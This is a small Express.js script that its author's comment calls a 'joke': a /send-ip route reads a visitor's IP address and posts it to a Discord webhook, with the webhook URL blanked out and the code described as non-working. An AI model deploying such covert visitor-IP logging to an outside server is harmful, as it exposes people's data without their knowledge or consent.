// so this was a joke script that was supposed to take ur public IP and post it to a public server channel as a joke but if you're seeing this it clearly means it dosn't work so I'm just gonna leave it here like this coz no reason. Their is also a script tag in the index.html file but again clearly it don't work (mostly a problem with github pages frfr)


const express = require('express');
const axios = require('axios');
const app = express();
const webhookUrl = 'haha no'; 

app.get('/send-ip', (req, res) => {
  const ipAddress = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const message = `Visitor's IP Address: ${ipAddress}`;

  axios.post(webhookUrl, { content: message })
    .then(() => {
      res.status(200).send('IP address sent to Discord.');
    })
    .catch((error) => {
      console.error('Error sending IP address to Discord:', error);
      res.status(500).send('Error sending IP address to Discord.');
    });
});

app.listen(3000, () => {
  console.log('Server listening on port 3000');
});
